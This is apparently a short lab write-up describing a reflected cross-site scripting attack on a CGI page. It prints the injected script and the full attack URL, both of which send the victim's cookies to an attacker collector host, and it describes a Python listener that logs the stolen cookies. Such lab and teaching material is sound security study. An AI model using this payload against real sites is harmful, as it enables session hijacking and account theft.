Attack Script
=============
For our attack, we formatted the injected javascript as follows (unencoded):
<script>window.open('http://192.169.1.1/collect?cookie='+document.cookie)</script>

The full non-url encoded url that is passed to the client is as follows:
http://192.169.1.3/cgi-bin/content.cgi?name=<script>window.open('http://192.169.1.1/collect?cookie='+document.cookie)</script>

Passing this script alone would not be accepted by the mozilla command
so we had to url encode it. We used the information at this page to do
so: http://www.w3schools.com/tags/ref_urlencode.asp

This javascript is sent as the name parameter to the vulnerable page.
When the client loads the page our script is placed in the DOM where the
name would usually go. The browser interprets this javascript and sends
the cookies to our collector.

Look in xss3.url for the full encoded url that was passed to the client
including the server address and page.

Cookie Collector
================
On the attacker machine (192.169.1.1) we setup a simple python script to
listen for incoming requests. The python script is configurable by port
but for our collection was setup on port 8080.

The attack url above sends the cookie in the query string as
cookie=<cookie value>. The python script simply parses the request and
looks for this paremeter in the get request. If a cookie parameter is
found it logs it to a file called 'cookies.log'.
